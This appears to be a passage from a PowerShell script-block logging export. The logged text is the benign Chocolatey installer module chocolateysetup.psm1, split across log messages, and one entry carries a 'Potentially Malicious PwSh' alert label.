""Get-ChocolateyInstallFolder"" [Environment]::GetEnvironmentVariable($chocInstallVariableName) } function Create-DirectoryIfNotExists($folderName){ Write-Debug ""Create-DirectoryIfNotExists"" if (![System.IO.Directory]::Exists($folderName)) { [System.IO.Directory]::CreateDirectory($folderName) | Out-Null } } function Get-LocalizedWellKnownPrincipalName { param ( [Parameter(Mandatory = $true)] [Security.Principal.WellKnownSidType] $WellKnownSidType ) $sid = New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList @($WellKnownSidType, $null) $account = $sid.Translate([Security.Principal.NTAccount]) return $account.Value } function Ensure-Permissions { param( [string]$folder ) Write-Debug ""Ensure-Permissions"" $defaultInstallPath = ""$env:SystemDrive\ProgramData\chocolatey"" try { $defaultInstallPath = Join-Path ([Environment]::GetFolderPath(""CommonApplicationData"")) 'chocolatey' } catch { # keep first setting } if ($folder.ToLower() -ne $defaultInstallPath.ToLower()) { Write-ChocolateyWarning ""Installation folder is not the default. Not changing permissions. Please ensure your installation is secure."" return } # Everything from here on out applies to the default installation folder if (!(Test-ProcessAdminRights)) { throw ""Installation of Chocolatey to default folder requires Administrative permissions. Please run from elevated prompt. Please see https://chocolatey.org/install for details and alternatives if needing to install as a non-administrator."" } $currentEA = $ErrorActionPreference $ErrorActionPreference = 'Stop' try { # get current acl $acl = (Get-Item $folder).GetAccessControl('Access,Owner') Write-Debug ""Removing existing permissions."" $acl.Access | % { $acl.RemoveAccessRuleAll($_) } $inheritanceFlags = ([Security.AccessControl.InheritanceFlags]::ContainerInherit -bor [Security.AccessControl.InheritanceFlags]::ObjectInherit) $propagationFlags = [Security.AccessControl.PropagationFlags]::None $rightsFullControl = [Security.AccessControl.FileSystemRights]::FullControl $rightsModify = [Security.AccessControl.FileSystemRights]::Modify $rightsReadExecute = [Security.AccessControl.FileSystemRights]::ReadAndExecute $rightsWrite = [Security.AccessControl.FileSystemRights]::Write Write-Output ""Restricting write permissions to Administrators"" $builtinAdmins = Get-LocalizedWellKnownPrincipalName -WellKnownSidType ([Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid) $adminsAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($builtinAdmins, $rightsFullControl, $inheritanceFlags, $propagationFlags, ""Allow"") $acl.SetAccessRule($adminsAccessRule) $localSystem = Get-LocalizedWellKnownPrincipalName -WellKnownSidType ([Security.Principal.WellKnownSidType]::LocalSystemSid) $localSystemAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($localSystem, $rightsFullControl, $inheritanceFlags, $propagationFlags, ""Allow"") $acl.SetAccessRule($localSystemAccessRule) $builtinUsers = Get-LocalizedWellKnownPrincipalName -WellKnownSidType ([Security.Principal.WellKnownSidType]::BuiltinUsersSid) $usersAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($builtinUsers, $rightsReadExecute, $inheritanceFlags, $propagationFlags, ""Allow"") $acl.SetAccessRule($usersAccessRule) $allowCurrentUser = $env:ChocolateyInstallAllowCurrentUser -eq 'true' if ($allowCurrentUser) { # get current user $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent() if ($currentUser.Name -ne $localSystem) { $userAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($currentUser.Name, $rightsModify, $inheritanceFlags, $propagationFlags, ""Allow"") Write-ChocolateyWarning 'Adding Modify permission for current user due to $env:ChocolateyInstallAllowCurrentUser. This could lead to escalation of privilege attacks. Consider not allowing this.' $acl.SetAccessRule($userAccessRule) } } else { Write-Debug 'Current user no longer set due to possible escalation of privileges - set $env:ChocolateyInstallAllowCurrentUser=""true"" if you require this.' } Write-Debug ""Set Owner to Administrators"" $builtinAdminsSid = New-Object System.Security.Principal.SecurityIdentifier([Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $null) $acl.SetOwner($builtinAdminsSid) Write-Debug ""Default Installation folder - removing inheritance with no copy"" $acl.SetAccessRuleProtection($true, $false) # enact the changes against the actual (Get-Item $folder).SetAccessControl($acl) # set an explicit append permission on the logs folder Write-Debug ""Allow users to append to log files."" $logsFolder = ""$folder\logs"" Create-DirectoryIfNotExists $logsFolder $logsAcl = (Get-Item $logsFolder).GetAccessControl('Access') $usersAppendAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($builtinUsers, $rightsWrite, [Security.AccessControl.InheritanceFlags]::ObjectInherit, [Security.AccessControl.PropagationFlags]::InheritOnly, ""Allow"") $logsAcl.SetAccessRule($usersAppendAccessRule) $logsAcl.SetAccessRuleProtection($false, $true) (Get-Item $logsFolder).SetAccessControl($logsAcl) } catch { Write-ChocolateyWarning ""Not able to set permissions for $folder."" } $ErrorActionPreference = $currentEA } function Upgrade-OldChocolateyInstall { param( [string]$chocolateyPathOld = ""$sysDrive\Chocolatey"", [string]$chocolateyPath = ""$($env:ALLUSERSPROFILE)\chocolatey"" ) Write-Debug ""Upgrade-OldChocolateyInstall"" if (Test-Path $chocolateyPathOld) { Write-Output ""Attempting to upgrade `'$chocolateyPathOld`' to `'$chocolateyPath`'."" Write-ChocolateyWarning ""Copying the contents of `'$chocolateyPathOld`' to `'$chocolateyPath`'. `n This step may fail if you have anything in this folder running or locked."" Write-Output 'If it fails, just manually copy the rest of the items out and then delete the folder.' Write-ChocolateyWarning ""!!!! ATTN: YOU WILL NEED TO CLOSE AND REOPEN YOUR SHELL !!!!"" #-ForegroundColor Magenta -BackgroundColor Black $chocolateyExePathOld = Join-Path $chocolateyPathOld 'bin' 'Machine', 'User' | % { $path = Get-EnvironmentVariable -Name 'PATH' -Scope $_ $updatedPath = [System.Text.RegularExpressions.Regex]::Replace($path,[System.Text.RegularExpressions.Regex]::Escape($chocolateyExePathOld) + '(?>;","MessageNumber: 1 ¦ MessageTotal: 4 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateysetup.psm1 ¦ ScriptBlockId: bb48825e-ea49-4f0d-bb5c-2b2443dd9239 ¦ ScriptBlockText: $thisScriptFolder = (Split-Path -parent $MyInvocation.MyCommand.Definition) $chocInstallVariableName = ""ChocolateyInstall"" $sysDrive = $env:SystemDrive $tempDir = $env:TEMP $defaultChocolateyPathOld = ""$sysDrive\Chocolatey"" $originalForegroundColor = $host.ui.RawUI.ForegroundColor function Write-ChocolateyWarning { param ( [string]$message = '' ) try { Write-Host ""WARNING: $message"" -ForegroundColor ""Yellow"" -ErrorAction ""Stop"" } catch { Write-Output ""WARNING: $message"" } } function Write-ChocolateyError { param ( [string]$message = '' ) try { Write-Host ""ERROR: $message"" -ForegroundColor ""Red"" -ErrorAction ""Stop"" } catch { Write-Output ""ERROR: $message"" } } function Initialize-Chocolatey { <# .DESCRIPTION This will initialize the Chocolatey tool by a) setting up the ""chocolateyPath"" (the location where all chocolatey nuget packages will be installed) b) Installs chocolatey into the ""chocolateyPath"" c) Instals .net 4.0 if needed d) Adds Chocolatey to the PATH environment variable so you have access to the choco commands. .PARAMETER ChocolateyPath Allows you to override the default path of (C:\ProgramData\chocolatey\) by specifying a directory chocolatey will install nuget packages. .EXAMPLE C:\PS> Initialize-Chocolatey Installs chocolatey into the default C:\ProgramData\Chocolatey\ directory. .EXAMPLE C:\PS> Initialize-Chocolatey -chocolateyPath ""D:\ChocolateyInstalledNuGets\"" Installs chocolatey into the custom directory D:\ChocolateyInstalledNuGets\ #> param( [Parameter(Mandatory=$false)][string]$chocolateyPath = '' ) Write-Debug ""Initialize-Chocolatey"" $installModule = Join-Path $thisScriptFolder 'chocolateyInstall\helpers\chocolateyInstaller.psm1' Import-Module $installModule -Force if ($chocolateyPath -eq '') { $programData = [Environment]::GetFolderPath(""CommonApplicationData"") $chocolateyPath = Join-Path ""$programData"" 'chocolatey' } # variable to allow insecure directory: $allowInsecureRootInstall = $false if ($env:ChocolateyAllowInsecureRootDirectory -eq 'true') { $allowInsecureRootInstall = $true } # if we have an already environment variable path, use it. $alreadyInitializedNugetPath = Get-ChocolateyInstallFolder if ($alreadyInitializedNugetPath -and $alreadyInitializedNugetPath -ne $chocolateyPath -and ($allowInsecureRootInstall -or $alreadyInitializedNugetPath -ne $defaultChocolateyPathOld)){ $chocolateyPath = $alreadyInitializedNugetPath } else { Set-ChocolateyInstallFolder $chocolateyPath } Create-DirectoryIfNotExists $chocolateyPath Ensure-Permissions $chocolateyPath #set up variables to add $chocolateyExePath = Join-Path $chocolateyPath 'bin' $chocolateyLibPath = Join-Path $chocolateyPath 'lib' if ($tempDir -eq $null) { $tempDir = Join-Path $chocolateyPath 'temp' Create-DirectoryIfNotExists $tempDir } $yourPkgPath = [System.IO.Path]::Combine($chocolateyLibPath,""yourPackageName"") @"" We are setting up the Chocolatey package repository. The packages themselves go to `'$chocolateyLibPath`' (i.e. $yourPkgPath). A shim file for the command line goes to `'$chocolateyExePath`' and points to an executable in `'$yourPkgPath`'. Creating Chocolatey folders if they do not already exist. ""@ | Write-Output Write-ChocolateyWarning ""You can safely ignore errors related to missing log files when `n upgrading from a version of Chocolatey less than 0.9.9. `n 'Batch file could not be found' is also safe to ignore. `n 'The system cannot find the file specified' - also safe."" #create the base structure if it doesn't exist Create-DirectoryIfNotExists $chocolateyExePath Create-DirectoryIfNotExists $chocolateyLibPath Install-ChocolateyFiles $chocolateyPath Ensure-ChocolateyLibFiles $chocolateyLibPath Install-ChocolateyBinFiles $chocolateyPath $chocolateyExePath $chocolateyExePathVariable = $chocolateyExePath.ToLower().Replace($chocolateyPath.ToLower(), ""%DIR%..\"").Replace(""\\"",""\"") Initialize-ChocolateyPath $chocolateyExePath $chocolateyExePathVariable Process-ChocolateyBinFiles $chocolateyExePath $chocolateyExePathVariable $realModule = Join-Path $chocolateyPath ""helpers\chocolateyInstaller.psm1"" Import-Module ""$realModule"" -Force if (-not $allowInsecureRootInstall -and (Test-Path($defaultChocolateyPathOld))) { Upgrade-OldChocolateyInstall $defaultChocolateyPathOld $chocolateyPath Install-ChocolateyBinFiles $chocolateyPath $chocolateyExePath } Add-ChocolateyProfile Install-DotNet4IfMissing Invoke-Chocolatey-Initial if ($env:ChocolateyExitCode -eq $null -or $env:ChocolateyExitCode -eq '') { $env:ChocolateyExitCode = 0 } @"" Chocolatey (choco.exe) is now ready. You can call choco from anywhere, command line or powershell by typing choco. Run choco /? for a list of functions. You may need to shut down and restart powershell and/or consoles first prior to using choco. ""@ | write-Output if (-not $allowInsecureRootInstall) { Remove-OldChocolateyInstall $defaultChocolateyPathOld } } function Set-ChocolateyInstallFolder { param( [string]$folder ) Write-Debug ""Set-ChocolateyInstallFolder"" $environmentTarget = [System.EnvironmentVariableTarget]::User # removing old variable Install-ChocolateyEnvironmentVariable -variableName ""$chocInstallVariableName"" -variableValue $null -variableType $environmentTarget if (Test-ProcessAdminRights) { Write-Debug ""Administrator installing so using Machine environment variable target instead of User."" $environmentTarget = [System.EnvironmentVariableTarget]::Machine # removing old variable Install-ChocolateyEnvironmentVariable -variableName ""$chocInstallVariableName"" -variableValue $null -variableType $environmentTarget } else { Write-ChocolateyWarning ""Setting ChocolateyInstall Environment Variable on USER and not SYSTEM variables.`n This is due to either non-administrator install OR the process you are running is not being run as an Administrator."" } Write-Output ""Creating $chocInstallVariableName as an environment variable (targeting `'$environmentTarget`') `n Setting $chocInstallVariableName to `'$folder`'"" Write-ChocolateyWarning ""It's very likely you will need to close and reopen your shell `n before you can use choco."" Install-ChocolateyEnvironmentVariable -variableName ""$chocInstallVariableName"" -variableValue ""$folder"" -variableType $environmentTarget } function Get-ChocolateyInstallFolder(){ Write-Debug ""Get-ChocolateyInstallFolder"" [Environment]::GetEnvironmentVariable($chocInstallVariableName) } function Create-DirectoryIfNotExists($folderName){ Write-Debug ""Create-DirectoryIfNotExists"" if (![System.IO.Directory]::Exists($folderName)) { [System.IO.Directory]::CreateDirectory($folderName) | Out-Null } } function Get-LocalizedWellKnownPrincipalName { param ( [Parameter(Mandatory = $true)] [Security.Principal.WellKnownSidType] $WellKnownSidType ) $sid = New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList @($WellKnownSidType, $null) $account = $sid.Translate([Security.Principal.NTAccount]) return $account.Value } function Ensure-Permissions { param( [string]$folder ) Write-Debug ""Ensure-Permissions"" $defaultInstallPath = ""$env:SystemDrive\ProgramData\chocolatey"" try { $defaultInstallPath = Join-Path ([Environment]::GetFolderPath(""CommonApplicationData"")) 'chocolatey' } catch { # keep first setting } if ($folder.ToLower() -ne $defaultInstallPath.ToLower()) { Write-ChocolateyWarning ""Installation folder is not the default. Not changing permissions. Please ensure your installation is secure."" return } # Everything from here on out applies to the default installation folder if (!(Test-ProcessAdminRights)) { throw ""Installation of Chocolatey to default folder requires Administrative permissions. Please run from elevated prompt. Please see https://chocolatey.org/install for details and alternatives if needing to install as a non-administrator."" } $currentEA = $ErrorActionPreference $ErrorActionPreference = 'Stop' try { # get current acl $acl = (Get-Item $folder).GetAccessControl('Access,Owner') Write-Debug ""Removing existing permissions."" $acl.Access | % { $acl.RemoveAccessRuleAll($_) } $inheritanceFlags = ([Security.AccessControl.InheritanceFlags]::ContainerInherit -bor [Security.AccessControl.InheritanceFlags]::ObjectInherit) $propagationFlags = [Security.AccessControl.PropagationFlags]::None $rightsFullControl = [Security.AccessControl.FileSystemRights]::FullControl $rightsModify = [Security.AccessControl.FileSystemRights]::Modify $rightsReadExecute = [Security.AccessControl.FileSystemRights]::ReadAndExecute $rightsWrite = [Security.AccessControl.FileSystemRights]::Write Write-Output ""Restricting write permissions to Administrators"" $builtinAdmins = Get-LocalizedWellKnownPrincipalName -WellKnownSidType ([Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid) $adminsAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($builtinAdmins, $rightsFullControl, $inheritanceFlags, $propagationFlags, ""Allow"") $acl.SetAccessRule($adminsAccessRule) $localSystem = Get-LocalizedWellKnownPrincipalName -WellKnownSidType ([Security.Principal.WellKnownSidType]::LocalSystemSid) $localSystemAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($localSystem, $rightsFullControl, $inheritanceFlags, $propagationFlags, ""Allow"") $acl.SetAccessRule($localSystemAccessRule) $builtinUsers = Get-LocalizedWellKnownPrincipalName -WellKnownSidType ([Security.Principal.WellKnownSidType]::BuiltinUsersSid) $usersAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($builtinUsers, $rightsReadExecute, $inheritanceFlags, $propagationFlags, ""Allow"") $acl.SetAccessRule($usersAccessRule) $allowCurrentUser = $env:ChocolateyInstallAllowCurrentUser -eq 'true' if ($allowCurrentUser) { # get current user $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent() if ($currentUser.Name -ne $localSystem) { $userAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($currentUser.Name, $rightsModify, $inheritanceFlags, $propagationFlags, ""Allow"") Write-ChocolateyWarning 'Adding Modify permission for current user due to $env:ChocolateyInstallAllowCurrentUser. This could lead to escalation of privilege attacks. Consider not allowing this.' $acl.SetAccessRule($userAccessRule) } } else { Write-Debug 'Current user no longer set due to possible escalation of privileges - set $env:ChocolateyInstallAllowCurrentUser=""true"" if you require this.' } Write-Debug ""Set Owner to Administrators"" $builtinAdminsSid = New-Object System.Security.Principal.SecurityIdentifier([Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $null) $acl.SetOwner($builtinAdminsSid) Write-Debug ""Default Installation folder - removing inheritance with no copy"" $acl.SetAccessRuleProtection($true, $false) # enact the changes against the actual (Get-Item $folder).SetAccessControl($acl) # set an explicit append permission on the logs folder Write-Debug ""Allow users to append to log files."" $logsFolder = ""$folder\logs"" Create-DirectoryIfNotExists $logsFolder $logsAcl = (Get-Item $logsFolder).GetAccessControl('Access') $usersAppendAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($builtinUsers, $rightsWrite, [Security.AccessControl.InheritanceFlags]::ObjectInherit, [Security.AccessControl.PropagationFlags]::InheritOnly, ""Allow"") $logsAcl.SetAccessRule($usersAppendAccessRule) $logsAcl.SetAccessRuleProtection($false, $true) (Get-Item $logsFolder).SetAccessControl($logsAcl) } catch { Write-ChocolateyWarning ""Not able to set permissions for $folder."" } $ErrorActionPreference = $currentEA } function Upgrade-OldChocolateyInstall { param( [string]$chocolateyPathOld = ""$sysDrive\Chocolatey"", [string]$chocolateyPath = ""$($env:ALLUSERSPROFILE)\chocolatey"" ) Write-Debug ""Upgrade-OldChocolateyInstall"" if (Test-Path $chocolateyPathOld) { Write-Output ""Attempting to upgrade `'$chocolateyPathOld`' to `'$chocolateyPath`'."" Write-ChocolateyWarning ""Copying the contents of `'$chocolateyPathOld`' to `'$chocolateyPath`'. `n This step may fail if you have anything in this folder running or locked."" Write-Output 'If it fails, just manually copy the rest of the items out and then delete the folder.' Write-ChocolateyWarning ""!!!! ATTN: YOU WILL NEED TO CLOSE AND REOPEN YOUR SHELL !!!!"" #-ForegroundColor Magenta -BackgroundColor Black $chocolateyExePathOld = Join-Path $chocolateyPathOld 'bin' 'Machine', 'User' | % { $path = Get-EnvironmentVariable -Name 'PATH' -Scope $_ $updatedPath = [System.Text.RegularExpressions.Regex]::Replace($path,[System.Text.RegularExpressions.Regex]::Escape($chocolateyExePathOld) + '(?>;","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:31.332 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,54,"ScriptBlock: )?', '', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase) if ($updatedPath -ne $path) { Write-Output ""Updating `'$_`' PATH to reflect removal of '$chocolateyPathOld'."" try { Set-EnvironmentVariable -Name 'Path' -Value $updatedPath -Scope $_ -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove the old environment variable from PATH. You will need to do this manually"" } } } Copy-Item ""$chocolateyPathOld\lib\*"" ""$chocolateyPath\lib"" -force -recurse $from = ""$chocolateyPathOld\bin"" $to = ""$chocolateyPath\bin"" $exclude = @(""choco.exe"", ""chocolatey.exe"", ""cinst.exe"", ""clist.exe"", ""cpack.exe"", ""cpush.exe"", ""cuninst.exe"", ""cup.exe"", ""cver.exe"", ""RefreshEnv.cmd"") Get-ChildItem -Path $from -recurse -Exclude $exclude | % { Write-Debug ""Copying $_ `n to $to"" if ($_.PSIsContainer) { Copy-Item $_ -Destination (Join-Path $to $_.Parent.FullName.Substring($from.length)) -Force -ErrorAction SilentlyContinue } else { $fileToMove = (Join-Path $to $_.FullName.Substring($from.length)) try { Copy-Item $_ -Destination $fileToMove -Exclude $exclude -Force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to move `'$fileToMove`'. You may need to reinstall the shim"" } } } } } function Remove-OldChocolateyInstall { param( [string]$chocolateyPathOld = ""$sysDrive\Chocolatey"" ) Write-Debug ""Remove-OldChocolateyInstall"" if (Test-Path $chocolateyPathOld) { Write-ChocolateyWarning ""This action will result in Log Errors, you can safely ignore those. `n You may need to finish removing '$chocolateyPathOld' manually."" try { Get-ChildItem -Path ""$chocolateyPathOld"" | % { if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } Write-Output ""Attempting to remove `'$chocolateyPathOld`'. This may fail if something in the folder is being used or locked."" Remove-Item ""$($chocolateyPathOld)"" -force -recurse -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$chocolateyPathOld`'. You will need to manually remove it."" } } } function Install-ChocolateyFiles { param( [string]$chocolateyPath ) Write-Debug ""Install-ChocolateyFiles"" Write-Debug ""Removing install files in chocolateyInstall, helpers, redirects, and tools"" ""$chocolateyPath\chocolateyInstall"", ""$chocolateyPath\helpers"", ""$chocolateyPath\redirects"", ""$chocolateyPath\tools"" | % { #Write-Debug ""Checking path $_"" if (Test-Path $_) { Get-ChildItem -Path ""$_"" | % { #Write-Debug ""Checking child path $_ ($($_.FullName))"" if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } } } Write-Debug ""Attempting to move choco.exe to choco.exe.old so we can place the new version here."" # rename the currently running process / it will be locked if it exists $chocoExe = Join-Path $chocolateyPath 'choco.exe' if (Test-Path ($chocoExe)) { Write-Debug ""Renaming '$chocoExe' to '$chocoExe.old'"" try { Remove-Item ""$chocoExe.old"" -force -ErrorAction SilentlyContinue Move-Item $chocoExe ""$chocoExe.old"" -force -ErrorAction SilentlyContinue } catch { Write-ChocolateyWarning ""Was not able to rename `'$chocoExe`' to `'$chocoExe.old`'."" } } # remove pdb file if it is found $chocoPdb = Join-Path $chocolateyPath 'choco.pdb' if (Test-Path ($chocoPdb)) { Remove-Item ""$chocoPdb"" -Force -ErrorAction SilentlyContinue } Write-Debug ""Unpacking files required for Chocolatey."" $chocInstallFolder = Join-Path $thisScriptFolder ""chocolateyInstall"" $chocoExe = Join-Path $chocInstallFolder 'choco.exe' $chocoExeDest = Join-Path $chocolateyPath 'choco.exe' Copy-Item $chocoExe $chocoExeDest -force Write-Debug ""Copying the contents of `'$chocInstallFolder`' to `'$chocolateyPath`'."" Copy-Item $chocInstallFolder\* $chocolateyPath -Recurse -Force } function Ensure-ChocolateyLibFiles { param( [string]$chocolateyLibPath ) Write-Debug ""Ensure-ChocolateyLibFiles"" $chocoPkgDirectory = Join-Path $chocolateyLibPath 'chocolatey' Create-DirectoryIfNotExists $chocoPkgDirectory if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { Write-Output ""chocolatey.nupkg file not installed in lib.`n Attempting to locate it from bootstrapper."" $chocoZipFile = Join-Path $tempDir ""chocolatey\chocInstall\chocolatey.zip"" Write-Debug ""First the zip file at '$chocoZipFile'."" Write-Debug ""Then from a neighboring chocolatey.*nupkg file '$thisScriptFolder/../../'."" if (Test-Path(""$chocoZipFile"")) { Write-Debug ""Copying '$chocoZipFile' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item ""$chocoZipFile"" ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { $chocoPkg = Get-ChildItem ""$thisScriptFolder/../../"" | ?{$_.name -match ""^chocolatey.*nupkg"" } | Sort name -Descending | Select -First 1 if ($chocoPkg -ne '') { $chocoPkg = $chocoPkg.FullName } ""$chocoZipFile"", ""$chocoPkg"" | % { if ($_ -ne $null -and $_ -ne '') { if (Test-Path $_) { Write-Debug ""Copying '$_' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item $_ ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } } } } } } function Install-ChocolateyBinFiles { param( [string] $chocolateyPath, [string] $chocolateyExePath ) Write-Debug ""Install-ChocolateyBinFiles"" Write-Debug ""Installing the bin file redirects"" $redirectsPath = Join-Path $chocolateyPath 'redirects' if (!(Test-Path ""$redirectsPath"")) { Write-ChocolateyWarning ""$redirectsPath does not exist"" return } $exeFiles = Get-ChildItem ""$redirectsPath"" -include @(""*.exe"",""*.cmd"") -recurse foreach ($exeFile in $exeFiles) { $exeFilePath = $exeFile.FullName $exeFileName = [System.IO.Path]::GetFileName(""$exeFilePath"") $binFilePath = Join-Path $chocolateyExePath $exeFileName $binFilePathRename = $binFilePath + '.old' $batchFilePath = $binFilePath.Replace("".exe"","".bat"") $bashFilePath = $binFilePath.Replace("".exe"","""") if (Test-Path ($batchFilePath)) { Remove-Item $batchFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($bashFilePath)) { Remove-Item $bashFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($binFilePathRename)) { try { Write-Debug ""Attempting to remove $binFilePathRename"" Remove-Item $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$binFilePathRename`'. This may cause errors."" } } if (Test-Path ($binFilePath)) { try { Write-Debug ""Attempting to rename $binFilePath to $binFilePathRename"" Move-Item -path $binFilePath -destination $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to rename `'$binFilePath`' to `'$binFilePathRename`'."" } } try { Write-Debug ""Attempting to copy $exeFilePath to $binFilePath"" Copy-Item -path $exeFilePath -destination $binFilePath -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to replace `'$binFilePath`' with `'$exeFilePath`'. You may need to do this manually."" } $commandShortcut = [System.IO.Path]::GetFileNameWithoutExtension(""$exeFilePath"") Write-Debug ""Added command $commandShortcut"" } } function Initialize-ChocolateyPath { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Initialize-ChocolateyPath"" Write-Debug ""Initializing Chocolatey Path if required"" $environmentTarget = [System.EnvironmentVariableTarget]::User if (Test-ProcessAdminRights) { Write-Debug ""Administrator installing so using Machine environment variable target instead of User."" $environmentTarget = [System.EnvironmentVariableTarget]::Machine } else { Write-ChocolateyWarning ""Setting ChocolateyInstall Path on USER PATH and not SYSTEM Path.`n This is due to either non-administrator install OR the process you are running is not being run as an Administrator."" } Install-ChocolateyPath -pathToInstall ""$chocolateyExePath"" -pathType $environmentTarget } function Process-ChocolateyBinFiles { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Process-ChocolateyBinFiles"" $processedMarkerFile = Join-Path $chocolateyExePath '_processed.txt' if (!(test-path $processedMarkerFile)) { $files = get-childitem $chocolateyExePath -include *.bat -recurse if ($files -ne $null -and $files.Count -gt 0) { Write-Debug ""Processing Bin files"" foreach ($file in $files) { Write-Output ""Processing $($file.Name) to make it portable"" $fileStream = [System.IO.File]::Open(""$file"", 'Open', 'Read', 'ReadWrite') $reader = New-Object System.IO.StreamReader($fileStream) $fileText = $reader.ReadToEnd() $reader.Close() $fileStream.Close() $fileText = $fileText.ToLower().Replace(""`"""" + $chocolateyPath.ToLower(), ""SET DIR=%~dp0%`n""""%DIR%..\"").Replace(""\\"",""\"") Set-Content $file -Value $fileText -Encoding Ascii } } Set-Content $processedMarkerFile -Value ""$([System.DateTime]::Now.Date)"" -Encoding Ascii } } # Adapted from http://www.west-wind.com/Weblog/posts/197245.aspx function Get-FileEncoding($Path) { $bytes = [byte[]](Get-Content $Path -Encoding byte -ReadCount 4 -TotalCount 4) if(!$bytes) { return 'utf8' } switch -regex ('{0:x2}{1:x2}{2:x2}{3:x2}' -f $bytes[0],$bytes[1],$bytes[2],$bytes[3]) { '^efbbbf' { return 'utf8' } '^2b2f76' { return 'utf7' } '^fffe' { return 'unicode' } '^feff' { return 'bigendianunicode' } '^0000feff' { return 'utf32' } default { return 'ascii' } } } function Add-ChocolateyProfile { Write-Debug ""Add-ChocolateyProfile"" try { $profileFile = ""$profile"" if ($profileFile -eq $null -or $profileFile -eq '') { Write-Output 'Not setting tab completion: Profile variable ($profile) resulted in an empty string.' return } $profileDirectory = (Split-Path -Parent $profileFile) if ($env:ChocolateyNoProfile -ne $null -and $env:ChocolateyNoProfile -ne '') { Write-Warning ""Not setting tab completion: Environment variable ""ChocolateyNoProfile"" exists and is set."" return } $localSystem = Get-LocalizedWellKnownPrincipalName -WellKnownSidType ([Security.Principal.WellKnownSidType]::LocalSystemSid) # get current user $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent() if ($currentUser.Name -eq $localSystem) { Write-Warning ""Not setting tab completion: Current user is SYSTEM user."" return } if (!(Test-Path($profileDirectory))) { Write-Debug ""Creating '$profileDirectory'"" New-Item ""$profileDirectory"" -Type Directory -Force -ErrorAction SilentlyContinue | Out-Null } if (!(Test-Path($profileFile))) { Write-Warning ""Not setting tab completion: Profile file does not exist at '$profileFile'."" return #Write-Debug ""Creating '$profileFile'"" #"""" | Out-File $profileFile -Encoding UTF8 } # Check authenticode, but only if file is greater than 4 bytes $profileFileInfo = New-Object System.IO.FileInfo($profileFile) if ($profileFileInfo.Length -ge 5) { $signature = Get-AuthenticodeSignature $profile if ($signature.Status -ne 'NotSigned') { Write-Warning ""Not setting tab completion: File is Authenticode signed at '$profile'."" return } } $profileInstall = @' # Chocolatey profile $ChocolateyProfile = ""$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"" if (Test-Path($ChocolateyProfile)) { Import-Module ""$ChocolateyProfile"" } '@ $chocoProfileSearch = '$ChocolateyProfile' if(Select-String -Path $profileFile -Pattern $chocoProfileSearch -Quiet -SimpleMatch) { Write-Debug ""Chocolatey profile is already installed."" return } Write-Output 'Adding Chocolatey to the profile. This will provide tab completion, refreshenv, etc.' $profileInstall | Out-File $profileFile -Append -Encoding (Get-FileEncoding $profileFile) Write-ChocolateyWarning 'Chocolatey profile installed. Reload your profile - type . $profile' if ($PSVersionTable.PSVersion.Major -lt 3) { Write-ChocolateyWar","MessageNumber: 2 ¦ MessageTotal: 4 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateysetup.psm1 ¦ ScriptBlockId: bb48825e-ea49-4f0d-bb5c-2b2443dd9239 ¦ ScriptBlockText: )?', '', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase) if ($updatedPath -ne $path) { Write-Output ""Updating `'$_`' PATH to reflect removal of '$chocolateyPathOld'."" try { Set-EnvironmentVariable -Name 'Path' -Value $updatedPath -Scope $_ -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove the old environment variable from PATH. You will need to do this manually"" } } } Copy-Item ""$chocolateyPathOld\lib\*"" ""$chocolateyPath\lib"" -force -recurse $from = ""$chocolateyPathOld\bin"" $to = 